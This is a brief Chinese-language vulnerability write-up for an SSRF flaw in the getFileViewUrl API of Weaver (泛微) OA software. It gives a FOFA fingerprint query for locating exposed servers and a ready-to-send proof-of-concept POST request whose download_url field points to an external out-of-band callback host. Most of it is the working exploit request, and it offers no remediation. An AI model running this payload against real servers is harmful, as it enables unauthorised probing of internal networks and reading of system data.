**fofa**

```
icon_hash="1578525679"
```

**一、漏洞简述**

泛微OA是一个专注于协同管理软件领域的公司，成立于2001年，总部位于上海。泛微OA致力于帮助组织构建统一的数字化运营平台，提供包括e-cology、e-office、eteams、e-nation等在内的产品系列，覆盖大中型企业和中小型企业的需求，以及一体化的移动办公云OA平台。其接口getFileViewUrl存在SSRF漏洞，攻击者可通过该漏洞读取系统信息和探测内网信息。

**二、漏洞检测poc**

```yaml

POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Content-Length: 126

{
    "file_id": "1",
    "file_name": "2",
    "download_url":"http://123.njaw3tvf9q2jgyvtkusegt80ur0io9cy.oastify.com"
}
```

